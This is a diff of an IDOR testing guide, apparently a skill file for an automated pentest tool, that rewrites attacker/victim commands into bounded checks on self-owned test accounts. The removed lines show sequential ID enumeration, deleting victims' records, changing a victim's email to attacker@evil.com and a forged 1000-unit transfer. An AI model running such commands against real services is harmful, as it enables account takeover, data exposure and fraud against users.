@@ -1,8 +1,8 @@
 ---
 name: attack-idor-automation
-description: "IDOR automated testing — cross-account access, horizontal/vertical privilege escalation, mass data exposure"
+description: "Validate object-level authorization with controlled cross-account comparisons and bounded IDOR checks"
 category: "web-application"
-version: "1.0"
+version: "1.1.0"
 author: "cyberstrike-official"
 tags:
   - idor
@@ -33,90 +33,89 @@ Systematically test all API endpoints for Insecure Direct Object Reference vulne
 
 ### Phase 1: Set Up Two Accounts
 
-1. **Account A** (victim) — owns resources being tested
-2. **Account B** (attacker) — tries to access Account A's resources
+1. **Account A** — a test account that owns the test resources
+2. **Account B** — a second test account you control, used to check whether Account A's resources are improperly accessible
 
 ### Phase 2: Automated Cross-Account Testing
 
 ```bash
-# Test endpoints from file
+# Include only endpoints and object IDs created by the two test accounts in endpoints.txt
 attack_script idor_tester \
-  --token-a "VICTIM_JWT" \
-  --token-b "ATTACKER_JWT" \
+  --token-a "ACCOUNT_A_TEST_JWT" \
+  --token-b "ACCOUNT_B_TEST_JWT" \
   --endpoints endpoints.txt \
   --json-output
 
 # Test comma-separated endpoints
 attack_script idor_tester \
-  --token-a "VICTIM_JWT" \
-  --token-b "ATTACKER_JWT" \
+  --token-a "ACCOUNT_A_TEST_JWT" \
+  --token-b "ACCOUNT_B_TEST_JWT" \
   --endpoints "https://TARGET/api/users/123,https://TARGET/api/orders/456,https://TARGET/api/profile/123" \
   --method GET
 
 # Test write operations
 attack_script idor_tester \
-  --token-a "VICTIM_JWT" \
-  --token-b "ATTACKER_JWT" \
+  --token-a "ACCOUNT_A_TEST_JWT" \
+  --token-b "ACCOUNT_B_TEST_JWT" \
   --endpoints endpoints.txt \
   --method PUT \
-  --data '{"name":"pwned"}'
+  --data '{"name":"CYBERSTRIKE_IDOR_CANARY"}'
 ```
 
 ### Phase 3: Manual Testing Patterns
 
 **Horizontal IDOR (same role, different user):**
 ```bash
-# Sequential IDs
-curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/1
-curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/2
+# Compare only IDs from test objects owned by accounts you control
+curl --max-time 15 --connect-timeout 5 -s -D- -H "Authorization: Bearer ACCOUNT_B_TEST_TOKEN" "https://TARGET/api/users/$TEST_USER_A_ID"
+curl --max-time 15 --connect-timeout 5 -s -D- -H "Authorization: Bearer ACCOUNT_B_TEST_TOKEN" "https://TARGET/api/users/$TEST_USER_B_ID"
 
-# UUID guessing (if predictable)
-curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/UUID_OF_OTHER_USER
-
-# Endpoint enumeration
-for id in $(seq 1 100); do
-  curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer ATTACKER_TOKEN" "https://TARGET/api/orders/$id"
+# Compare one known test-owned object ID at a time; do not guess or enumerate other users' IDs
+for id in "$TEST_ORDER_ID_A" "$TEST_ORDER_ID_B"; do
+  curl --max-time 15 --connect-timeout 5 -s -o /dev/null -w "%{http_code}\\n" -H "Authorization: Bearer ACCOUNT_B_TEST_TOKEN" "https://TARGET/api/orders/$id"
+  sleep 1
 done
 ```
 
 **Vertical IDOR (low-priv accessing high-priv):**
 ```bash
-# User accessing admin endpoints
-curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/users
-curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/settings
-curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/internal/reports
+# Use only a test tenant or an approved endpoint; inspect authorization outcome without collecting real user records
+curl --max-time 15 --connect-timeout 5 -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/users
+curl --max-time 15 --connect-timeout 5 -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/settings
+curl --max-time 15 --connect-timeout 5 -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/internal/reports
 ```
 
 ### Phase 4: HTTP Method Switching
 
 ```bash
-# GET blocked but DELETE works
-curl -X DELETE -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID
+# Only against a disposable test-owned record; DELETE is state-changing
+curl --max-time 15 --connect-timeout 5 -X DELETE -H "Authorization: Bearer ACCOUNT_B_TEST_TOKEN" https://TARGET/api/users/TEST_OWNED_DISPOSABLE_USER_ID
 
 # GET blocked but PATCH works
-curl -X PATCH -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID \
-  -d '{"email":"attacker@evil.com"}'
+curl --max-time 15 --connect-timeout 5 -X PATCH -H "Authorization: Bearer ACCOUNT_B_TEST_TOKEN" https://TARGET/api/users/TEST_OWNED_DISPOSABLE_USER_ID \
+  -d '{"email":"idor-canary@example.invalid"}'
 ```
 
 ### Phase 5: Parameter Pollution
 
 ```bash
 # Dual ID injection
-curl "https://TARGET/api/profile?user_id=ATTACKER&user_id=VICTIM"
+curl --max-time 15 --connect-timeout 5 "https://TARGET/api/profile?user_id=TEST_ACCOUNT_B_ID&user_id=TEST_ACCOUNT_A_ID"
 
 # Body override
-curl -X POST https://TARGET/api/transfer \
-  -H "Authorization: Bearer ATTACKER_TOKEN" \
-  -d '{"from":"VICTIM_ID","to":"ATTACKER_ID","amount":1000}'
+# Only if the program authorizes transaction testing; use a disposable test balance and accounts you control
+curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/test-transfer \
+  -H "Authorization: Bearer ACCOUNT_B_TEST_TOKEN" \
+  -d '{"from":"TEST_ACCOUNT_A_ID","to":"TEST_ACCOUNT_B_ID","amount":1}'
 ```
 
 ### Phase 6: Response Comparison
 
 ```bash
 # Compare responses between two auth contexts
-attack_script response_diff "https://TARGET/api/users/VICTIM_ID" \
-  --header-a "Authorization:Bearer VICTIM_TOKEN" \
-  --header-b "Authorization:Bearer ATTACKER_TOKEN" \
+attack_script response_diff "https://TARGET/api/users/TEST_OWNED_DISPOSABLE_USER_ID" \
+  --header-a "Authorization:Bearer ACCOUNT_A_TEST_TOKEN" \
+  --header-b "Authorization:Bearer ACCOUNT_B_TEST_TOKEN" \
   --json-output
 ```
 
@@ -124,18 +123,18 @@ attack_script response_diff "https://TARGET/api/users/VICTIM_ID" \
 
 | Finding | Severity |
 |---------|----------|
-| Read other user's PII (email, SSN, etc.) | Critical (P1) |
-| Modify other user's data | Critical (P1) |
-| Delete other user's resources | Critical (P1) |
-| Access admin functionality | Critical (P1) |
-| Read non-sensitive data of other user | Medium (P3) |
+| Read sensitive data from another test account | Severity depends on sensitivity, scope, and demonstrated impact |
+| Modify another test account's data | Severity depends on the action and resulting impact |
+| Delete another test account's disposable resource | Severity depends on recoverability and impact |
+| Access admin-only functionality | Severity depends on the permissions and actions actually demonstrated |
+| Read non-sensitive data from another test account | Severity depends on exposure and program policy |
 
 ## Evidence Requirements
 
 - Two different auth tokens used
 - Endpoint tested
-- Account A (victim) response as baseline
-- Account B (attacker) accessing Account A's resource
+- Account A (test account) response as baseline
+- Account B (second test account you control) accessing Account A's resource
 - Data received proving cross-account access
 
 ## Tools
@@ -143,6 +142,26 @@ attack_script response_diff "https://TARGET/api/users/VICTIM_ID" \
 - `attack_script idor_tester` — automated cross-account testing
 - `attack_script response_diff` — response comparison
 - `attack_script jwt_tamper` — token manipulation for IDOR
+
+## Object-Relationship Coverage
+
+Do not limit the check to swapping a top-level numeric ID. With test-owned records, check whether authorization is enforced for nested relationships and alternate references such as file IDs, attachment IDs, invoice/order IDs, tenant or organization IDs, and GraphQL/global IDs where the application uses them.
+
+- Compare ownership and role checks across list, detail, export/download, update, and delete operations. Each action is a separate authorization claim.
+- When the API accepts an organization or tenant ID in the request body, verify that the authenticated account is actually a member of that organization; a client-supplied identifier is not proof of membership.
+- Prefer a small, explicit test fixture over sequential ID enumeration. Do not scan other users' identifiers or save unrelated personal data.
+- Distinguish horizontal access (another peer account's object) from vertical access (a lower-privilege role performing a higher-privilege action), and report only the boundary that was demonstrated.
+
+## Verification and False Positives
+
+- Use two accounts you own (for example, Account A and Account B) and objects created by those accounts. Do not enumerate or collect identifiers belonging to unrelated users.
+- Confirm the object belongs to Account B, then request it using Account A's session. Verify sensitive fields or unauthorized state changes in the response; HTTP 200 alone is not proof.
+- Distinguish public objects, intentionally shared resources, and role-authorized access from an actual access-control failure. Review the expected permission model before reporting.
+- Test read, update, and delete separately. A read-only IDOR does not prove write access, and a rejected update does not invalidate a separately confirmed read exposure.
+- Keep automated testing bounded: use a small list of test-owned object IDs, low concurrency, request timeouts, and a stop condition for errors or unexpected data. Do not run broad ID enumeration against production.
+- Preserve sanitized before/after evidence, the roles of both test accounts, object ownership, and the exact endpoint/method. Redact tokens and personal data.
+- [uphiago/recon-skills — IDOR hunting](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-idor/SKILL.md) (external research reference; not a local Cyber Strike skill path).
+- [elementalsouls/Claude-BugHunter — IDOR hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-idor/SKILL.md) (external research reference; not a local Cyber Strike skill path).
 
 ## References
 
